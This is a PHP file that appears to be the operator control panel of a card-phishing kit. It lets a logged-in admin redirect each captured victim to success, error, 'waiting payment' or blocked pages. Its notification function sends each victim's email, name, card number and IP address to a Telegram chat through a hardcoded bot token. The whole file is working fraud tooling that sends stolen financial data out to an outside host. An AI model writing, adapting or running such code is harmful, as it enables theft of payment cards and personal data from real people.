<?php
session_start();
if (!isset($_SESSION['admin_loggedin']) || $_SESSION['admin_loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

$db_file = 'data/users.db';

if (isset($_GET['id'], $_GET['decision'])) {
    $user_id = basename($_GET['id']);
    $decision = $_GET['decision'];
    
    if (!file_exists($db_file)) {
        header('Location: dashboard.php?error=db_not_found');
        exit;
    }
    
    $users = json_decode(file_get_contents($db_file), true) ?: [];
    
    if (!isset($users[$user_id])) {
        header('Location: dashboard.php?error=user_not_found');
        exit;
    }
    
    // Handle different decisions
    switch ($decision) {
        case 'success':
            $users[$user_id]['status'] = 'redirected';
            $users[$user_id]['redirect_to'] = 'success.php';
            $users[$user_id]['last_updated'] = time();
            // Send Telegram notification for success
            sendTelegramNotification($users[$user_id], 'SUCCESS');
            break;
            
        case 'error':
            $users[$user_id]['status'] = 'redirected';
            $users[$user_id]['redirect_to'] = 'error.php';
            $users[$user_id]['last_updated'] = time();
            sendTelegramNotification($users[$user_id], 'ERROR');
            break;
            
        case 'waiting':
            $users[$user_id]['status'] = 'redirected';
            $users[$user_id]['redirect_to'] = 'waitingPay.php';
            $users[$user_id]['last_updated'] = time();
            sendTelegramNotification($users[$user_id], 'WAITING PAYMENT');
            break;
            
        case 'block':
            $users[$user_id]['status'] = 'blocked';
            $users[$user_id]['redirect_to'] = 'blocked.php';
            $users[$user_id]['last_updated'] = time();
            sendTelegramNotification($users[$user_id], 'BLOCKED');
            break;
            
        case 'delete':
            unset($users[$user_id]);
            break;
            
        case 'refresh':
            $users[$user_id]['last_seen'] = time();
            break;
    }
    
    // Save changes
    file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));
}

header('Location: dashboard.php');
exit;

function sendTelegramNotification($user, $action) {
    $bot_token = '8519765168:AAEJk6HCHDQY5fYAa2GfR5mzMrUxeSGPbF8';
    $chat_id = '-5209514131';
    
    $data = $user['data'] ?? [];
    $message = "🚨 *ADMIN ACTION*\n\n";
    $message .= "📧 *Email:* `" . ($data['email'] ?? 'N/A') . "`\n";
    $message .= "👤 *Name:* `" . ($data['name'] ?? 'N/A') . "`\n";
    $message .= "💳 *Card:* `" . ($data['card'] ?? 'N/A') . "`\n";
    $message .= "📍 *IP:* `" . ($user['ip'] ?? 'N/A') . "`\n";
    $message .= "🎯 *Action:* `" . $action . "`\n";
    $message .= "🕐 *Time:* " . date('H:i:s');
    
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    // Send in background (non-blocking)
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode([
                'chat_id' => $chat_id,
                'text' => $message,
                'parse_mode' => 'Markdown'
            ]),
            'timeout' => 1
        ]
    ]);
    
    @file_get_contents($url, false, $context);
}
?>